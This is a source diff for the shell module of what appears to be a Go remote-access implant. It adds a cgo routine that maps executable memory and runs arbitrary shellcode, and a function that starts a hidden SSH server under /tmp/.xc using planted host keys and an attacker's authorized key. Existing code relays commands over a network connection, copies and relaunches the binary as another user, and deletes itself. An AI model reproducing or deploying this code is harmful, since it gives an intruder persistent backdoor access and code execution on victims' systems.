@@ -1,21 +1,34 @@
 package shell
 
 import (
-	"net"
+	"errors"
+	"fmt"
+	"io/ioutil"
 	"log"
+	"net"
 	"os"
 	"os/exec"
 	"os/user"
-	"fmt"
 	"strings"
-	"errors"
+	"unsafe"
 
 	"../utils"
 )
 
 /*
- It would be awesome if someone implemented this as well ;-)
+#include <stdio.h>
+#include <sys/mman.h>
+#include <string.h>
+#include <unistd.h>
+
+void execute(char *shellcode, size_t length) {
+	unsigned char *ptr;
+	ptr = (unsigned char *) mmap(0, length, PROT_READ|PROT_WRITE|PROT_EXEC, MAP_ANONYMOUS | MAP_PRIVATE, -1, 0);
+	memcpy(ptr, shellcode, length);
+	( *(void(*) ()) ptr)();
+  }
 */
+import "C"
 
 // Shell ...
 func Shell() *exec.Cmd {
@@ -35,15 +48,15 @@ func Exec(command string, c net.Conn) {
 // RunAsPs ...
 func RunAs(username string, pass string, domain string, c net.Conn) {
 	current, err := user.Current()
-	if (err != nil) {
+	if err != nil {
 		c.Write([]byte("Error: " + err.Error() + "\n"))
 		return
 	}
 	uid := current.Uid
-	if (uid == "0") {
+	if uid == "0" {
 		path := CopySelf()
 		err = os.Chmod(path, 0755)
-		if (err != nil) {
+		if err != nil {
 			c.Write([]byte("Error: Couldn't chmod\n"))
 			return
 		}
@@ -51,7 +64,7 @@ func RunAs(username string, pass string, domain string, c net.Conn) {
 		args := fmt.Sprintf("%s %s %s", path, ip, port)
 		fmt.Println(args)
 		err = CreateProcessAsUser(username, path, args)
-		if (err != nil) {
+		if err != nil {
 			c.Write([]byte("Error: " + err.Error() + "\n"))
 			return
 		}
@@ -71,7 +84,9 @@ func RunAsPS(username string, pass string, domain string, c net.Conn) {
 
 // ExecSC ....
 func ExecSC(sc []byte) {
-	fmt.Println("Not implemented")
+	ptr := &sc[0]
+	size := len(sc)
+	C.execute((*C.char)(unsafe.Pointer(ptr)), (C.size_t)(size))
 }
 
 // ExecOut ...
@@ -79,7 +94,8 @@ func ExecOut(command string) (string, error) {
 	path := "/bin/sh"
 	cmd := exec.Command(path, "-c", command)
 	out, err := cmd.CombinedOutput()
-	return string(out), err}
+	return string(out), err
+}
 
 // ExecPSOut ...
 func ExecPSOut(command string) (string, error) {
@@ -134,4 +150,60 @@ func Seppuku(c net.Conn) {
 	binPath := os.Args[0]
 	fmt.Println(binPath)
 	go Exec(fmt.Sprintf("sleep 5 && rm %s", binPath), c)
+}
+
+// StartSSHServer ...
+func StartSSHServer(port int, c net.Conn) {
+	tmpDir := "/tmp/.xc"
+	ExecSilent(fmt.Sprintf("mkdir -p %s", tmpDir), c)
+	hostRsaFile := fmt.Sprintf("%s/host_rsa", tmpDir)
+	hostDsaFile := fmt.Sprintf("%s/host_dsa", tmpDir)
+	hostRsaPubFile := fmt.Sprintf("%s/host_rsa.pub", tmpDir)
+	hostDsaPubFile := fmt.Sprintf("%s/host_dsa.pub", tmpDir)
+	authKeyFile := fmt.Sprintf("%s/key_pub", tmpDir)
+
+	utils.SaveRaw(hostRsaFile, host_rsa)
+	utils.SaveRaw(hostDsaFile, host_dsa)
+	utils.SaveRaw(hostRsaPubFile, host_rsa_pub)
+	utils.SaveRaw(hostDsaPubFile, host_dsa_pub)
+	utils.SaveRaw(authKeyFile, key_pub)
+
+	files, err := ioutil.ReadDir(tmpDir)
+	if err != nil {
+		fmt.Println(err)
+	}
+	for _, f := range files {
+		if err = os.Chmod(fmt.Sprintf("%s/%s", tmpDir, f.Name()), 0600); err != nil {
+			fmt.Println(err)
+		}
+	}
+
+	config := ""
+	config += fmt.Sprintf("Port %d\n", port)
+	config += "Protocol 2\n"
+	config += fmt.Sprintf("HostKey %s\n", hostRsaFile)
+	config += fmt.Sprintf("HostKey %s\n", hostDsaFile)
+	config += "PubkeyAuthentication yes\n"
+	config += fmt.Sprintf("AuthorizedKeysFile %s\n", authKeyFile)
+	config += "IgnoreRhosts yes\n"
+	config += "HostbasedAuthentication yes\n"
+	config += "PermitEmptyPasswords no\n"
+	config += "ChallengeResponseAuthentication no\n"
+	config += "PasswordAuthentication no \n"
+	config += "X11Forwarding yes\n"
+	config += "X11DisplayOffset 10\n"
+	config += "PrintMotd no\n"
+	config += "PrintLastLog yes\n"
+	config += "TCPKeepAlive yes\n"
+	config += "AcceptEnv LANG LC_*\n"
+	config += "UsePAM no\n"
+	config += "StrictModes no\n"
+
+	utils.SaveRaw(fmt.Sprintf("%s/sshd_config", tmpDir), config)
+	_, err = ExecOut(fmt.Sprintf("/usr/sbin/sshd -f %s/sshd_config", tmpDir))
+	if err == nil {
+		c.Write([]byte(fmt.Sprintf("SSH server started on port %d\n", port)))
+	} else {
+		c.Write([]byte("Couldn't start ssh server\n"))
+	}
 }
